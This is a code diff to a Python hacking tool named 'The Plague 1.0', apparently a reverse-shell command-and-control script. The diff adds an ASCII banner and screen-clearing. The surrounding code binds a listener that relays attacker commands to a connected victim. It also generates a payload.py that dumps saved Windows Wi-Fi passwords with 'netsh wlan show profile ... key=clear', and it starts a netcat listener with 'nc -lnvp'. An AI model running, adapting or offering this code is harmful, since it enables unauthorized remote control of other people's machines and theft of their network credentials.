@@ -2,8 +2,28 @@ import sys
 import os
 import time
 from socket import *
-
-
+import platform
+banner = """                                                                          
+    @@@@@@@  @@@  @@@  @@@@@@@@     @@@@@@@   @@@        @@@@@@    @@@@@@@@  @@@  @@@  @@@@@@@@  
+    @@@@@@@  @@@  @@@  @@@@@@@@     @@@@@@@@  @@@       @@@@@@@@  @@@@@@@@@  @@@  @@@  @@@@@@@@  
+      @@!    @@!  @@@  @@!          @@!  @@@  @@!       @@!  @@@  !@@        @@!  @@@  @@!       
+      !@!    !@!  @!@  !@!          !@!  @!@  !@!       !@!  @!@  !@!        !@!  @!@  !@!       
+      @!!    @!@!@!@!  @!!!:!       @!@@!@!   @!!       @!@!@!@!  !@! @!@!@  @!@  !@!  @!!!:!    
+      !!!    !!!@!!!!  !!!!!:       !!@!!!    !!!       !!!@!!!!  !!! !!@!!  !@!  !!!  !!!!!:    
+      !!:    !!:  !!!  !!:          !!:       !!:       !!:  !!!  :!!   !!:  !!:  !!!  !!:       
+      :!:    :!:  !:!  :!:          :!:        :!:      :!:  !:!  :!:   !::  :!:  !:!  :!:       
+       ::    ::   :::   :: ::::      ::        :: ::::  ::   :::   ::: ::::  ::::: ::   :: ::::  
+       :      :   : :  : :: ::       :        : :: : :   :   : :   :: :: :    : :  :   : :: ::   
+        The Plague 1.0
+        Coded by Omar Ahmed
+        Date of relese: March 4th 2023 """
+def clear_scr():
+    if platform.platform()[0:3] == "Lin":
+        os.system("clear")
+    elif platform.platform()[0:3] == "Win":
+        os.system("cls")
+    else:
+        return
 def error_out():
     print("invalid argument")
     print("python3 nclient.py [Option] [argument1] [argument2]")
@@ -33,29 +53,41 @@ try:
 
                     ip = f"{LHOST}"
                     port = int(LPORT)
-
+                    clear_scr()
+                    print(banner)
+                    print("Listening...")
                     connection = socket(AF_INET, SOCK_STREAM)
                     connection.bind((ip, port))
-
+                    
                     connection.listen(5)
                     client, addr = connection.accept()
+                    
                     print("connect -> "+str(addr))
+                    print("")
                     print("type exit to quit")
+                    print("")
                     def main_func():
                         while True:
                             recever = client.recv(2000).decode()
                             print(recever)
-                            cmd = input("The-Plague>")
-                            
-                            
-                                
+                            cmd = input("The-Plague>")                         
                             if cmd == "exit" :
                                 client.send(cmd.encode())
                                 exit()
                             elif cmd == "" or cmd == None:
-                                cmd = "error"
+                                try:
+                                    cmd = ("?")
+                                except:
+                                    pass
                                 client.send(cmd.encode())
-                            
+                            elif cmd == "cls":
+                                try:
+                                    clear_scr()
+                                    print(banner)
+                                    
+                                except:
+                                    pass
+                                client.send(cmd.encode())                                    
                             else:
                                 client.send(cmd.encode())
                     main_func()
@@ -89,7 +121,7 @@ def final_func():
                     os.chdir(recever[3:])
                 except:
                     pass
-                connection.send(os.getcwd().encode())
+                connection.send(os.getcwd().encode())   
             elif recever == "":
                 os.chdir(recever[3:])
                 connection.send(os.getcwd().encode())
@@ -130,7 +162,6 @@ while True:
                     exit()
                 f = open("payload.py", "w")
                 f.write(f'''import os
-import time
 import platform
 if platform.platform()[0:3] == "Win":
     command = os.popen('netsh wlan show profile name="{wifi_name}" key=clear')
@@ -140,6 +171,9 @@ if platform.platform()[0:3] == "Win":
     f.write("========================================================================")
 else:
     exit()''')
+                f.close()
+                clear_scr()
+                print(banner)
         except IndexError:
             print("invalid argument")
             print("try:  python3 nclient.py 1 [argument]")
@@ -181,7 +215,8 @@ try:
 except:
     print()''')
         f.close()
-       
+        clear_scr()
+        print(banner)
         os.system(f"nc -lnvp {LPORT} -s {LHOST}")
        
             
